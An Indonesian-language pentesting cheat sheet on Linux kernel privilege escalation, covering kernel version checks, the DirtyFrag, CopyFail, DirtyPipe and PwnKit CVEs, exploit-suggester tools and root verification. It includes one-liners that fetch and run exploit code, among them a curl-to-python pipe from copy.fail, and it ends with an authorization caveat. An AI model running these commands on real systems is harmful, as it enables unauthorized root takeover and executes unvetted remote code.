# Kernel LPE (Local Privilege Escalation)

## Modern Kernel LPE (dirtyfrag / copyfail)

LPE kernel TERBARU, DETERMINISTIK (bukan race). Cek kernel dulu:

```bash
uname -r
```

| Kernel                        | Vulnerable                                                   |
| ----------------------------- | ------------------------------------------------------------ |
| Ubuntu 5.15.0-XXX (XXX < 181) | dirtyfrag (CVE-2026-43284/43500) + copyfail (CVE-2026-31431) |
| Debian 5.10.0-9               | DirtyPipe (CVE-2022-0847) + copyfail subset                  |

### DirtyFrag (CVE-2026-43284/43500)

```bash
# One-liner: clone, compile, execute
git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
```

> **Catatan:** dirtyfrag butuh modul esp4/esp6/rxrpc (cek: `lsmod` / `modinfo`)

### CopyFail (CVE-2026-31431)

```bash
# One-liner: download & execute
curl https://copy.fail/exp | python3 && su
```

### Langkah Umum

```text
1. uname -r
   → Tentukan versi kernel

2. Ambil PoC
   → Gunakan sumber publik/repository penemu

3. Compile di target
   → gcc
   ATAU
   → Transfer binary yang sesuai dengan GLIBC

4. Jalankan PoC
   → Uji apakah privilege escalation berhasil

5. Verifikasi
   → id
   → uid/euid=0 berarti root
```

---

## Linux Exploit Suggester

Tool otomatis untuk suggest kernel exploit berdasarkan versi kernel target.

### Sumber

- https://github.com/The-Z-Labs/linux-exploit-suggester
  - LES
- https://github.com/jondonas/linux-exploit-suggester-2
  - LES2 - Perl

### Cara Pakai

```bash
# Di target: ambil versi kernel
uname -r

# Di Kali: run LES dengan kernel version dari target
./linux-exploit-suggester.sh --kernel <KERNEL_VERSION>
```

### Output

Tool akan menampilkan:

```text
Kernel version
List CVE yang mungkin vulnerable
Link ke exploit/PoC
Tingkat exposure:
- highly probable
- probable
- less probable
```

> **Fokus pada hasil `[CVE-xxx] highly probable` terlebih dahulu.**

---

## Kernel Exploit (Umum)

```bash
uname -r                                     # versi kernel
searchsploit linux kernel <versi>            # cari exploit lokal
```

### Contoh Exploit Populer

```text
DirtyPipe
CVE-2022-0847
# Vulnerability pada Linux kernel yang dapat digunakan untuk privilege escalation
# pada kernel yang terdampak.

DirtyCOW
# Vulnerability kernel lama yang berkaitan dengan race condition
# pada mekanisme copy-on-write.

PwnKit
CVE-2021-4034
# Local Privilege Escalation pada pkexec/polkit.
```

### Cross-Check

```text
Kernel Version
      ↓
Distro / OS Version
      ↓
Patch Level
      ↓
CVE
      ↓
Exploit Compatibility
      ↓
PoC
      ↓
Privilege Escalation
```

> **Catatan:** Cross-check versi kernel dengan patch sebelum menjalankan exploit.
> Compile di target jika memungkinkan.

---

## Quick Enumeration

```bash
# Cek kernel
uname -r

# Cek informasi OS
cat /etc/os-release

# Cek user dan privilege
id
sudo -l

# Cek kernel module yang relevan
lsmod
modinfo <MODULE>
```

## Verifikasi Root

```bash
id

# Jika berhasil privilege escalation:
# uid=0(root)
# euid=0(root)
```

> **Catatan:** Kernel LPE hanya boleh diuji pada sistem yang dimiliki atau
> secara eksplisit diizinkan untuk pengujian keamanan.
